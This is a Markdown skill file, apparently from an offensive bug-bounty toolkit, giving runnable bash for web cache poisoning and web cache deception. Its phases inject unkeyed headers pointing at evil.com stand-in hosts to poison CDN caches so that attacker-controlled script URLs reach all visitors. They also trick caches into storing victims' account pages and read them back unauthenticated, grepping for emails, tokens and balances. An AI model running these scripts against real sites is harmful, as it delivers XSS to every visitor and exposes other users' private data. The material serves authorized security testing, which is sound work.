---
name: k1nzr3c0n-hunt-cache-poison
description: "Web Cache Poisoning and Web Cache Deception hunting skill. Unkeyed headers, fat GET, cache key normalization, CDN-specific exploits (Cloudflare, Fastly, Varnish). Web Cache Deception: force caching of dynamic content via path confusion."
tags: [cache-poison, cache-deception, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Cache Poisoning / Deception

> **Cache Poisoning**: serve malicious content to all users via poisoned cache entry.
> **Cache Deception**: trick cache into storing victim's private page, then read it.

---

## Crown Jewels

```
Priority 1 — XSS via cache poisoning (XSS served to all visitors from CDN)
Priority 2 — Cache Deception: cache victim's profile/account page → read as attacker
Priority 3 — Host header → cache poison → full domain XSS
Priority 4 — Fat GET: body in GET request treated as POST, response cached
Priority 5 — Vary header bypass: poison per-user cached content
```

---

## Phase 0 — Identify Cache Infrastructure

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_cache_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
BASE="https://${TARGET}"

echo "=== Cache Detection ==="
HEADERS=$(curl -skI "${BASE}/" 2>/dev/null)
echo "$HEADERS" | grep -iE 'x-cache|cf-cache|age:|cache-control|x-varnish|via:|x-served-by|surrogate' | sed 's/^/  /'

echo ""
# Identify CDN
echo "$HEADERS" | grep -qi 'cloudflare\|cf-ray' && echo "  [CDN] Cloudflare"
echo "$HEADERS" | grep -qi 'fastly' && echo "  [CDN] Fastly"
echo "$HEADERS" | grep -qi 'varnish' && echo "  [CDN] Varnish"
echo "$HEADERS" | grep -qi 'akamai' && echo "  [CDN] Akamai"
echo "$HEADERS" | grep -qi 'x-amz-cf' && echo "  [CDN] AWS CloudFront"
echo "$HEADERS" | grep -qi 'x-cache.*nginx' && echo "  [CDN] Nginx Cache"
```

## Phase 1 — Unkeyed Header Injection

```bash
echo "=== Unkeyed Header Cache Poisoning ==="
BASE="https://${TARGET}"
OOB_ID="$(openssl rand -hex 4)"

# Unkeyed headers to test (reflected in response but not included in cache key)
UNKEYED_HEADERS=(
  "X-Forwarded-Host: ${OOB_ID}.evil.com"
  "X-Forwarded-Scheme: nothttps"
  "X-Forwarded-For: evil.com"
  "X-Original-URL: /evil"
  "X-Host: ${OOB_ID}.evil.com"
  "X-Forwarded-Port: 1337"
  "X-Forwarded-Proto: http"
  "Forwarded: host=${OOB_ID}.evil.com"
)

for HEADER in "${UNKEYED_HEADERS[@]}"; do
  RESP=$(curl -sk "${BASE}/" -H "$HEADER")
  echo "$RESP" | grep -oiP "${OOB_ID}[^\s<\"'\`]{0,50}" | head -1 | \
    sed "s/^/  [REFLECT via $HEADER] /"
done

echo ""
echo "If unkeyed header reflected in response → check if cached:"
echo "  1. Send poison request once with: X-Forwarded-Host: ATTACKER.com"
echo "  2. Check response for X-Cache: HIT on subsequent normal request"
echo "  3. If HIT with attacker URL → cache poisoned for all users"
```

## Phase 2 — Cache Poisoning → XSS

```bash
echo "=== Cache Poison → XSS ==="
XSS_MARKER="$(openssl rand -hex 5)"
BASE="https://${TARGET}"

# If X-Forwarded-Host is reflected in script src or meta redirect
POISON_HEADER="X-Forwarded-Host: evil.com/${XSS_MARKER}"

# Send poisoned request
RESP=$(curl -sk "${BASE}/" -H "$POISON_HEADER")
echo "$RESP" | grep -oi "evil.com/${XSS_MARKER}" | head -3 | sed 's/^/  [REFLECTED] /'

# Check if absolute URL pointing to attacker domain appears
echo "$RESP" | grep -oP 'src=["\x27]https?://[^"\x27]+' | grep -v "${TARGET}" | head -5 | \
  sed 's/^/  [ABS-URL] /'

# Then check cache hit
RESP2=$(curl -skI "${BASE}/")
echo "$RESP2" | grep -i 'x-cache\|age:' | sed 's/^/  [CACHE] /'
echo "$RESP2" | grep -qi 'x-cache: hit' && echo "  *** CACHE POISONED ***"
```

## Phase 3 — Web Cache Deception

```bash
echo "=== Web Cache Deception ==="
# Trick: GET /account/profile.css → server returns profile page, cache stores as static CSS

BASE="https://${TARGET}"
SESSION_COOKIE="${SESSION_COOKIE:-}"
ACCT2_COOKIE="${ACCT2_COOKIE:-}"  # Attacker's account (or fresh session)

# Step 1: As victim, request dynamic page with static extension
DYNAMIC_PAGES=(
  "/account"
  "/profile"
  "/settings"
  "/dashboard"
  "/api/user/me"
)

for PAGE in "${DYNAMIC_PAGES[@]}"; do
  # Trick 1: append static extension
  for EXT in ".css" ".js" ".png" ".jpg" ".woff" ".gif"; do
    RESP=$(curl -sk "${BASE}${PAGE}${EXT}" \
      -H "Cookie: ${SESSION_COOKIE}")
    CACHE=$(curl -skI "${BASE}${PAGE}${EXT}" | grep -i 'x-cache\|age:')
    
    # Check if victim's content is in cached version
    echo "$RESP" | grep -qiE 'email|username|phone|address|balance|token' && \
      echo "  [DECEPTION?] ${PAGE}${EXT} returns private data ($CACHE)"
  done
done

# Step 2: As attacker, read the cached page
echo ""
echo "If page is cached — read it as attacker (no auth):"
for PAGE in "${DYNAMIC_PAGES[@]}"; do
  for EXT in ".css" ".js"; do
    RESP=$(curl -sk "${BASE}${PAGE}${EXT}")  # no cookie
    echo "$RESP" | grep -qiE '"email"|"username"|"balance"' && \
      echo "  [DECEPTION HIT] ${PAGE}${EXT} leaks private data without auth"
  done
done
```

## Gate 0

```bash
echo "=== Cache Gate 0 ==="
echo "  Poisoning: X-Cache: HIT on subsequent request showing attacker content"
echo "  XSS chain: verify XSS fires in browser on cached page (not just reflected)"
echo "  Deception: victim data readable WITHOUT auth after cache priming"
echo "  Impact: must affect OTHER users (not just own session)"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Web Cache Poisoning via unkeyed X-Forwarded-Host header on [/] — CDN caches attacker's JavaScript URL served to all visitors
Web Cache Deception on [/account.css] caches victim's account page containing email and phone number
```
